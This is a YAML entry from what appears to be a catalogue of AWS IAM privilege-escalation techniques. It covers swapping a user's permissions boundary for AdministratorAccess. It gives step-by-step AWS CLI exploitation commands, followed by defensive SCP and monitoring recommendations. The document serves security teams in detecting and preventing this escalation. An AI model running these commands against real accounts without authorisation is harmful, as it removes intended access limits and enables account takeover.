id: iam-024
name: iam:PutUserPermissionsBoundary
category: self-escalation
services:
- iam
description: |
  Instead of deleting a permissions boundary, an attacker with `iam:PutUserPermissionsBoundary` can replace it with a permissive one (e.g., a boundary that allows `*` on `*`). The new boundary won't constrain anything — effectively the same result as deleting it, but using a different API call that may not be monitored as closely.
prerequisites:
  admin:
  - Target user must have IAM policies attached that grant more permissions than the current boundary allows
  - A permissive managed policy must exist to use as the new boundary (e.g., AdministratorAccess or a custom `*:*` policy)
  - Attacker must have `iam:PutUserPermissionsBoundary` on the target user
  lateral:
  - Must have iam:PutUserPermissionsBoundary on their own user or the target user
  - Must identify a permissive managed policy ARN to use as the replacement boundary
permissions:
  required:
  - permission: iam:PutUserPermissionsBoundary
    resourceConstraints: Must have permission to set the permissions boundary on the target user ARN
  additional:
  - permission: iam:ListPolicies
    resourceConstraints: Helpful for discovering available permissive managed policies to use as replacement
  - permission: iam:GetUser
    resourceConstraints: Useful for viewing the current boundary on the target user
exploitationSteps:
  awscli:
  - step: 1
    command: aws iam get-user --user-name TARGET_USER
    description: View the user's current permissions boundary
  - step: 2
    command: aws iam list-policies --query 'Policies[?PolicyName==`AdministratorAccess`].Arn' --output text
    description: Find the ARN of a permissive policy to use as the new boundary (AdministratorAccess)
  - step: 3
    command: |
      aws iam put-user-permissions-boundary \
        --user-name TARGET_USER \
        --permissions-boundary arn:aws:iam::aws:policy/AdministratorAccess
    description: Replace the restrictive boundary with AdministratorAccess, effectively removing all constraints
  - step: 4
    command: aws sts get-caller-identity
    description: Verify current identity
  - step: 5
    command: aws iam list-users --max-items 3
    description: Verify that previously-blocked permissions are now accessible
recommendation: |
  Use SCPs to deny boundary modification. The same protections that prevent boundary deletion should also prevent boundary replacement.

  SCP to prevent boundary modification:
  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Deny",
        "Action": [
          "iam:PutUserPermissionsBoundary",
          "iam:PutRolePermissionsBoundary",
          "iam:DeleteUserPermissionsBoundary",
          "iam:DeleteRolePermissionsBoundary"
        ],
        "Resource": "*",
        "Condition": {
          "StringNotLike": {
            "aws:PrincipalARN": "arn:aws:iam::*:role/BoundaryAdmin"
          }
        }
      }
    ]
  }
  ```

  Additional controls:
  - **Monitor both Put and Delete** — Alert on `PutUserPermissionsBoundary` events as well as deletions, since replacement achieves the same result
  - **Restrict boundary policies** — Use SCPs to enforce that only specific pre-approved boundary policies can be applied
  - **Use iam:PermissionsBoundary condition** — Enforce that new boundaries must be from an approved list
  - **Detect boundary drift** — Compare current boundaries against expected values and alert on changes
  - **Deny self-modification** — Ensure users cannot replace their own boundaries
  - **Regular audits** — Verify boundary-protected users retain their expected boundary ARNs
limitations: |
  Same as boundary deletion — this only works if the underlying policies grant more permissions than the current boundary allows. If the user's policies are already limited in scope, swapping the boundary provides no additional access.
